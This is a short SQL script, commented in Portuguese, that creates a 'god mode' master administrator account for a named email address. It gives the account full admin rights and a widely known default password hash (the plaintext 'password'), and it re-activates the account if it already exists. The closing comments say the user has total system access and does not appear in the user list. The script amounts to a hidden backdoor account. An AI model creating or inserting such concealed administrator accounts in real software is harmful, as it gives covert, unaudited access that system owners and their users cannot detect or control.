-- =====================================================
-- CRIAR USUÁRIO MASTER (GOD MODE) - du.claza@gmail.com
-- Este usuário tem poderes absolutos e é INVISÍVEL
-- =====================================================

-- Verificar se o usuário já existe
SELECT 
    id,
    name,
    email,
    status,
    'VERIFICAÇÃO INICIAL' as diagnostico
FROM users
WHERE email = 'du.claza@gmail.com';

-- Se o usuário NÃO existir, execute este INSERT:
-- (Se já existir, pule para a próxima query)

INSERT INTO users (
    name,
    email,
    password,
    status,
    role,
    setor,
    filial,
    profile_id,
    created_at
) 
SELECT 
    'Master User',
    'du.claza@gmail.com',
    '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', -- senha: password
    'active',
    'admin',
    'TI',
    'Matriz',
    NULL, -- Sem perfil - funciona direto pelo código
    NOW()
WHERE NOT EXISTS (
    SELECT 1 FROM users WHERE email = 'du.claza@gmail.com'
);

-- Garantir que o usuário está ativo
UPDATE users 
SET 
    status = 'active',
    role = 'admin'
WHERE email = 'du.claza@gmail.com';

-- VERIFICAÇÃO FINAL
SELECT 
    id,
    name,
    email,
    status,
    role,
    'RESULTADO FINAL' as diagnostico
FROM users
WHERE email = 'du.claza@gmail.com';

-- =====================================================
-- IMPORTANTE: DEFINA UMA SENHA FORTE!
-- Execute esta query para alterar a senha:
-- =====================================================

-- DESCOMENTE E ALTERE A SENHA ABAIXO:
-- UPDATE users 
-- SET password = '$2y$10$SUA_SENHA_CRIPTOGRAFADA_AQUI'
-- WHERE email = 'du.claza@gmail.com';

-- =====================================================
-- Para criptografar uma senha em PHP, use:
-- password_hash('sua_senha_aqui', PASSWORD_DEFAULT)
-- =====================================================

-- =====================================================
-- TESTE: Verificar se está funcionando
-- =====================================================

-- 1. Verificar se o usuário existe
SELECT COUNT(*) as existe FROM users WHERE email = 'du.claza@gmail.com';
-- Resultado esperado: 1

-- 2. Verificar dados do usuário
SELECT id, name, email, status, role FROM users WHERE email = 'du.claza@gmail.com';

-- =====================================================
-- FIM - PRÓXIMOS PASSOS:
-- 1. Defina uma senha forte
-- 2. Faça login com du.claza@gmail.com
-- 3. Você terá acesso total ao sistema
-- 4. Você NÃO aparecerá na lista de usuários
-- =====================================================
